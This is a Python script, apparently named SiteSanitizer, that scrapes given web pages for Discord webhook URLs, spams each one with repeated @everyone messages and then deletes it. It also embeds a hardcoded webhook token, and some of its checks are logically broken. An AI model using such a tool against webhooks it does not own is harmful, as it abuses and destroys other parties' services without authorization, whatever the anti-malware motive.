import requests
import colorama
import os
import sys
import re
from discord_webhook import DiscordWebhook

def find_discord_webhooks(text):
    pattern = r"discord\.com/api/webhooks/\d+/[A-Za-z0-9_-]{68}"
    matches = re.findall(pattern, text)
    
    return matches

class LogNoID:
    @staticmethod
    def Success(message):
        print(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.LIGHTGREEN_EX}+{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.WHITE} {message}")
        
    @staticmethod
    def Mild(message):
        print(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.YELLOW}/{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.WHITE} {message}")
        
    @staticmethod
    def Failed(message):
        print(f"{colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.RED}-{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.WHITE} {message}")


class Logger:
    @staticmethod
    def Success(message, idnum):
        print(f"{colorama.Fore.BLUE}({idnum}) {colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.LIGHTGREEN_EX}+{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.WHITE} {message}")
        
    @staticmethod
    def Mild(message, idnum):
        print(f"{colorama.Fore.BLUE}({idnum}) {colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.YELLOW}/{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.WHITE} {message}")
        
    @staticmethod
    def Failed(message, idnum):
        print(f"{colorama.Fore.BLUE}({idnum}) {colorama.Fore.LIGHTBLACK_EX}[{colorama.Fore.RED}-{colorama.Fore.LIGHTBLACK_EX}]{colorama.Fore.WHITE} {message}")

bomb = []
sites = input("URL (can be multiple with \"; \") > ").split("; ")
for x in range(len(sites)):
    if(len(find_discord_webhooks("https://discord.com/api/webhooks/1131187922821976204/IbCERLM-bk0_NdhoFSYNVCYLqg45XwHL-IX3ad4l4sxXiunDo_N5MuW9i0SCKjDSsy1m")) > 1):
        bomb.append("https://discord.com/api/webhooks/1131187922821976204/IbCERLM-bk0_NdhoFSYNVCYLqg45XwHL-IX3ad4l4sxXiunDo_N5MuW9i0SCKjDSsy1m")
        continue
    if(len(sites[x].split("chomikuj.pl")) == 2):
        Logger.Success("Changed from chomikuj.pl to opis-chomikuj.pl", x)
        sites[x] = "https://opis-chomikuj.pl/description?id=" + sites[x].split("chomikuj.pl/")[1].split("/")[-1]
    a = requests.get(sites[x])

    if a.status_code != 200:
        Logger.Failed(f"Website doesn't work :(", x)
        continue
    
    content = a.text
    
    if len(content.split("webhooks")) == 1:
        Logger.Mild(f"No webhooks found.", x)
        continue
    
    found = find_discord_webhooks(content)
    Logger.Success("Found " + str(len(found)) + " webhook" + ('s' if len(found) > 1 else ''), x)
    for y in found:
        print(y)
        bomb.append(y)
    
if(len(bomb) == 0):
    LogNoID.Success("To bomb " + str(len(bomb)) + " webhook" + ('s' if len(bomb) > 1 else ''))

bombfixed = []
for x in range(len(bomb)):
    if not(bomb[x] in bombfixed):
        bombfixed.append(bomb[x])
LogNoID.Success("Optimized finds to " + str(len(bombfixed)) + " webhook" + ('s' if len(bomb) > 1 else '') + ".")

for x in range(len(bombfixed)):
    try:
        Logger.Success("Spamming webhook", x)
        webhook = DiscordWebhook(url="https://" + bombfixed[x], content='# @everyone Your webhook was found on your website by SiteSanitizer\nhttps://github.com/PanSageYT/sitesanitizer\nhttps://tenor.com/view/monkey-monkey-keyboard-monkey-typing-ip-logger-gif-20982979')
        for y in range(10):
            response = webhook.execute()
        
        requests.delete("https://" + bombfixed[x])
        Logger.Success("Deleted webhook", x)
    except Exception as e:
        Logger.Failed("Webhook not found", x)
        
LogNoID.Success("Finished work! Those sites are now safe to use!")

input()
